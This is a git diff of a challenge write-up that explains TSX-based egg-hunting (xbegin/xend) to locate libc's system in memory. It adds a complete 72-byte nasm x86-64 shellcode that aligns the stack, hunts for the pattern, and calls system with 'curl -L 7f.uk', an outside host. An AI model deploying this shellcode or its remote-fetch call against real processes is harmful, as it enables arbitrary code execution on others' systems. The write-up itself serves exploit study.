@@ -42,7 +42,7 @@ Also, let's keep in mind different `libc` versions might have the `system` symbo
 Well, I've decided to borrow an idea from [Dan Clemente's blogpost on TSX-based egg-hunting](https://bugnotfound.com/posts/htb-business-ctf-2024-abusing-intel-tsx-to-solve-a-sandbox-challenge/).  
 Dan has done an awesome work during [HTB Business CTF 2024](https://ctf.hackthebox.com/event/details/htb-business-ctf-2024-the-vault-of-hope-1474) but here's the gist of it:
 - Intel [TSX](https://en.wikipedia.org/wiki/Transactional_Synchronization_Extensions) is an extension to the Intel ISA that supports transactional memory.
-- The idea is to find a "pattern" in the entire memory by capturing bad memory access using the `beginx` and `endx` instructions.
+- The idea is to find a "pattern" in the entire memory by capturing bad memory access using the `xbegin` and `xend` instructions.
 
 So, the first question I had was whether there's a unique pattern in `libc!system` that I could find. Well, as it turns out, `4 bytes` were enough to find it!  
 I've done the following:
@@ -113,9 +113,56 @@ def get_system_pattern_with_offset():
     return (pattern, pattern_location, system_offset)
 ```
 
+So, my shellcode is quite simple, even though I saw one issue when calling `libc!system` - it saves MMX registers on the stack, which means we have to keep the stack 16-bytes aligned! Therefore:
+1. My shellcode will align the stack to 16-bytes.
+2. My shellcode will initialize `RSI` and look for the unique pattern (saved in `ECX`) between `xbegin` and `xend` - bad memory access will roll to the *relative* address mentioned in `xbegin`, which suits shellcodes well.
+3. Once pattern is found - use the offset to point `RSI` to `libc!system`.
+4. Prepare the sole argument in `RDI` by using `call-pop`.
 
+So, here's my shellcode (I use [nasm](https://nasm.us/)):
 
+```assembly
+[BITS 64]
 
+; Constants acquired from preparation
+UNIQUE_PATTERN_BYTES EQU 0xe90774ff
+SYSTEM_OFFSET_FROM_LIBC EQU 0x50d70
+PATTERN_OFFSET_FROM_SYSTEM EQU 0x06
+
+        ; Make some stack is 16-byte aligned
+        and rsp, 0xFFFFFFFFFFFFFFF0
+
+        ; Egg-hunting the unique bytes
+        mov rsi, SYSTEM_OFFSET_FROM_LIBC + PATTERN_OFFSET_FROM_SYSTEM
+        mov ecx, UNIQUE_PATTERN_BYTES
+
+        mov rsi, 0x700007c50d76-0x10000
+egg_hunt:
+        add rsi, 0x1000
+        xbegin egg_hunt
+        cmp ecx, [rsi]
+        xend
+        jne egg_hunt
+
+        ; Point to libc!system
+        sub rsi, PATTERN_OFFSET_FROM_SYSTEM
+
+        ; Push the commandline
+        call call_system
+        db 'curl -L 7f.uk', 0
+
+call_system:
+        pop rdi
+        call rsi
+
+; Hang
+jmp $
+```
+
+The terms didn't mention whether the program should exist or not - for all means and purposes I could've let it crash, but I've decided to hang forver using `jmp $`.  
+With that, I got a shellcode of `72 bytes`.
+
+###
 
 
 
